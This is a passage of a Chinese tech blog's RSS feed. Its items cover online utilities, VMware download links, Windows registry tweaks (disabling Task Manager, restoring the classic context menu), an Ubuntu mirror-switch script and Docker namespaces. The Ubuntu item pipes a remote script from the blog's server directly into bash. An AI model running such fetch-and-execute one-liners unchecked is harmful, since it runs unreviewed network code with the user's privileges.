<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">  source</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $prefix</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">/custom.cfg</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">fi</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">### END /etc/grub.d/41_custom ###</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Cron在线表达式生成器</title>
      <link>https://www.geekery.cn/free-service/cron.html</link>
      <guid>https://www.geekery.cn/free-service/cron.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Cron在线表达式生成器</source>
      <description>Cron在线表达式生成器</description>
      <category>Tools</category>
      <pubDate>Wed, 15 Jan 2025 09:18:00 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>VMware最新下载地址（纪念碑）</title>
      <link>https://www.geekery.cn/note-book/VMware/VMware%E6%9C%80%E6%96%B0%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80.html</link>
      <guid>https://www.geekery.cn/note-book/VMware/VMware%E6%9C%80%E6%96%B0%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80.html</guid>
      <source url="https://www.geekery.cn/rss.xml">VMware最新下载地址（纪念碑）</source>
      <description>VMware最新下载地址（纪念碑） 直接提取了CDN直连地址如下 截至2025年3月26日博通公司已经完全封死CDN下载漏洞 请注册账户并下载： https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Workstation%20Pro&amp;freeDownloa...</description>
      <pubDate>Tue, 31 Dec 2024 06:45:31 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>直接提取了CDN直连地址如下</p>
</blockquote>
<h2>截至2025年3月26日博通公司已经完全封死CDN下载漏洞</h2>
<p>请注册账户并下载：</p>
<p>https://support.broadcom.com/group/ecx/productdownloads?subfamily=VMware%20Workstation%20Pro&amp;freeDownloads=true</p>
<p>以下信息为纪念碑信息</p>
<h2>纪念碑🥲</h2>
<p>版本举例： <a href="https://softwareupdate.vmware.com/cds/vmw-desktop/ws/17.6.2/24409262/windows/core/VMware-workstation-17.6.2-24409262.exe.tar" target="_blank" rel="noopener noreferrer">https://softwareupdate.vmware.com/cds/vmw-desktop/ws/17.6.2/24409262/windows/core/VMware-workstation-17.6.2-24409262.exe.tar</a></p>
<p>VMware的直连仓库地址： <a href="https://softwareupdate.vmware.com/cds/vmw-desktop/ws/" target="_blank" rel="noopener noreferrer">https://softwareupdate.vmware.com/cds/vmw-desktop/ws/</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>文本字符串倒序</title>
      <link>https://www.geekery.cn/free-service/text-reverse.html</link>
      <guid>https://www.geekery.cn/free-service/text-reverse.html</guid>
      <source url="https://www.geekery.cn/rss.xml">文本字符串倒序</source>
      <description>文本字符串倒序</description>
      <pubDate>Sun, 29 Dec 2024 17:44:26 GMT</pubDate>
      <content:encoded><![CDATA[
]]></content:encoded>
    </item>
    <item>
      <title>Windows禁用任务管理器</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows%E7%A6%81%E7%94%A8%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows%E7%A6%81%E7%94%A8%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows禁用任务管理器</source>
      <description>Windows禁用任务管理器 本指南介绍如何通过修改Windows注册表来禁用任务栏上的任务管理器。 警告：修改注册表可能会导致系统问题。请在更改前备份注册表。 禁用任务管理器 打开命令提示符（管理员） 按 Win + X，选择 命令提示符（管理员） 或 Windows PowerShell（管理员）。 执行命令 输入以下命令并按 Enter： 验证 ...</description>
      <pubDate>Thu, 26 Dec 2024 07:05:47 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>本指南介绍如何通过修改Windows注册表来禁用任务栏上的任务管理器。</p>
</blockquote>
<blockquote>
<p>警告：修改注册表可能会导致系统问题。请在更改前备份注册表。</p>
</blockquote>
<h2>禁用任务管理器</h2>
<p><strong>打开命令提示符（管理员）</strong></p>
<p>按 <code>Win + X</code>，选择 <code>命令提示符（管理员）</code> 或 <code>Windows PowerShell（管理员）</code>。</p>
<p><strong>执行命令</strong></p>
<p>输入以下命令并按 <code>Enter</code>：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">reg add </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">v DisableTaskMgr </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">t REG_DWORD </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">d </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>验证</strong></p>
<p>按 <code>Ctrl + Shift + Esc</code>，如果任务管理器无法打开，则禁用成功。</p>
<h2>重新启用任务管理器</h2>
<p><strong>打开命令提示符（管理员）</strong></p>
<p><strong>执行命令</strong></p>
<p>输入以下命令并按 <code>Enter</code>：</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">reg delete </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">v DisableTaskMgr </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p><strong>验证</strong></p>
<p>按 <code>Ctrl + Shift + Esc</code>，如果任务管理器打开，则启用成功。</p>
<h2>其他信息</h2>
<p><strong>注册表路径</strong>：<code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System</code></p>
<p><strong>注册表值</strong>：<code>DisableTaskMgr</code> 是 <code>REG_DWORD</code> 类型，<code>1</code> 表示禁用，删除表示启用。</p>
]]></content:encoded>
    </item>
    <item>
      <title>Windows11恢复Windows10右键菜单</title>
      <link>https://www.geekery.cn/note-book/Windows/Windows11%E6%81%A2%E5%A4%8DWindows10%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95.html</link>
      <guid>https://www.geekery.cn/note-book/Windows/Windows11%E6%81%A2%E5%A4%8DWindows10%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Windows11恢复Windows10右键菜单</source>
      <description>Windows11恢复Windows10右键菜单 Windows 11做了很多降级的操作 ，让人很不习惯，我经常需要右键菜单去做一些高级操作，比如Git Bash、7-Zip、复制粘贴，终于还是无法忍受右键菜单显示更多选项的折磨，下面是解决方法。 解决方法 解决方法是，CMD使用管理员模式输入下面的命令，可以将右键菜单恢复为Windows10模式 恢复...</description>
      <pubDate>Sun, 22 Dec 2024 03:01:43 GMT</pubDate>
      <content:encoded><![CDATA[
<p><strong>Windows 11做了很多降级的操作</strong>   ，让人很不习惯，我经常需要右键菜单去做一些高级操作，比如Git Bash、7-Zip、复制粘贴，终于还是无法忍受右键菜单显示更多选项的折磨，下面是解决方法。</p>
<h2>解决方法</h2>
<p>解决方法是，CMD使用管理员模式输入下面的命令，可以将右键菜单恢复为Windows10模式</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">reg add </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">taskkill </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">F </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">IM </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">explorer.exe</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">explorer.exe</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2>恢复Windows11右键菜单的方法</h2>
<p>如果更换后不习惯，可以使用CMD管理员模式输入下面的命令恢复。</p>
<div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:: 删除注册表项</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">reg delete </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32"</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">f</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:: 强制结束explorer.exe进程</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">taskkill </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">F </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">/</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">IM </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">explorer.exe</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:: 重新启动explorer.exe</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">start </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">explorer.exe</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Ubuntu一键设置镜像源</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E4%B8%80%E9%94%AE%E8%AE%BE%E7%BD%AE%E9%95%9C%E5%83%8F%E6%BA%90.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/Ubuntu/Ubuntu%E4%B8%80%E9%94%AE%E8%AE%BE%E7%BD%AE%E9%95%9C%E5%83%8F%E6%BA%90.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Ubuntu一键设置镜像源</source>
      <description>Ubuntu一键设置镜像源 简介 通过脚本一键更换系统的软件源为中国科学技术大学（USTC）镜像源，加速软件包的下载速度。 执行脚本 使用以下命令一键更换镜像源：</description>
      <pubDate>Sat, 21 Dec 2024 16:06:39 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>简介</h2>
<p>通过脚本一键更换系统的软件源为中国科学技术大学（USTC）镜像源，加速软件包的下载速度。</p>
<h2>执行脚本</h2>
<p>使用以下命令一键更换镜像源：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">curl</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -sSL</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> https://www.geekery.cn/sh/LinuxCTS/os/apt/ustc-mirror.sh</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> | </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">bash</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Base64在线编码解码</title>
      <link>https://www.geekery.cn/free-service/base64.html</link>
      <guid>https://www.geekery.cn/free-service/base64.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Base64在线编码解码</source>
      <description>Base64在线编码解码 最好用的 Base64 在线工具, 支持图片编解码和预览</description>
      <category>Tools</category>
      <pubDate>Wed, 18 Dec 2024 06:54:34 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>最好用的 Base64 在线工具, 支持图片编解码和预览</p>
</blockquote>
]]></content:encoded>
    </item>
    <item>
      <title>代码差异对比</title>
      <link>https://www.geekery.cn/free-service/code-diff.html</link>
      <guid>https://www.geekery.cn/free-service/code-diff.html</guid>
      <source url="https://www.geekery.cn/rss.xml">代码差异对比</source>
      <description>代码差异对比 查找两个文本文件之间的差异</description>
      <category>Tools</category>
      <pubDate>Sat, 14 Dec 2024 10:46:36 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>查找两个文本文件之间的差异</p>
</blockquote>

]]></content:encoded>
    </item>
    <item>
      <title>SSL 证书生成</title>
      <link>https://www.geekery.cn/free-service/SSLGenerate.html</link>
      <guid>https://www.geekery.cn/free-service/SSLGenerate.html</guid>
      <source url="https://www.geekery.cn/rss.xml">SSL 证书生成</source>
      <description>SSL 证书生成 声明： 本服务为学习用途，通过自建 CA 签发 SSL 证书。请勿用于生产环境。 网上的证书签发要么签发门槛很高，要么价格极高。 我去查询了阿某云的价格表格。 这价格很是惊人，于是乎我自己做了CA服务器，仅供学习。 用途上的话网站急需证书却无法签发可以使用，切勿生产使用。</description>
      <pubDate>Fri, 13 Dec 2024 10:43:06 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p><strong>声明：</strong> 本服务为学习用途，通过自建 CA 签发 SSL 证书。<strong>请勿用于生产环境</strong>。</p>
</blockquote>
<p>网上的证书签发要么签发门槛很高，要么价格极高。</p>
<p>我去查询了阿某云的价格表格。</p>
<p>| 证书类型       | 适用场景                | 支持域名        | 价格（人民币/月） |
|</p>
]]></content:encoded>
    </item>
    <item>
      <title>为Docker分配物理网卡</title>
      <link>https://www.geekery.cn/note-book/Docker/%E4%B8%BADocker%E5%88%86%E9%85%8D%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/%E4%B8%BADocker%E5%88%86%E9%85%8D%E7%89%A9%E7%90%86%E7%BD%91%E5%8D%A1.html</guid>
      <source url="https://www.geekery.cn/rss.xml">为Docker分配物理网卡</source>
      <description>为Docker分配物理网卡 Docker内部使用了Net namespace进行网络隔离，我们也可以利用这种底层的特性来魔改容器。 运行中的容器都对应一个PID，每个PID都有自己的名称空间，它的名称空间在 /proc/[PID]/ns 下 namespace都是链接文件，格式为xxx:[inode number]。 Kubernests的Pod 的S...</description>
      <pubDate>Fri, 22 Nov 2024 09:53:26 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p>Docker内部使用了Net namespace进行网络隔离，我们也可以利用这种底层的特性来魔改容器。</p>
</blockquote>
<p>运行中的容器都对应一个PID，每个PID都有自己的名称空间，它的名称空间在 /proc/[PID]/ns 下</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">ls</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -lah</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /proc/2047/ns/</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">total</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dr-x--x--x</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:41</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> .</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">dr-xr-xr-x</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 9</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:41</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ..</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> cgroup</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'cgroup:[4026532459]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ipc</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'ipc:[4026532343]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mnt</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'mnt:[4026532341]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:41</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> net</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'net:[4026532400]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'pid:[4026532344]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:52</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pid_for_children</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'pid:[4026532344]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:44</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'time:[4026531834]'</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">lrwxrwxrwx</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> root</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> Nov</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 22</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 09:52</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> time_for_children</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> -&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">'time:[4026531834]'</span></span>
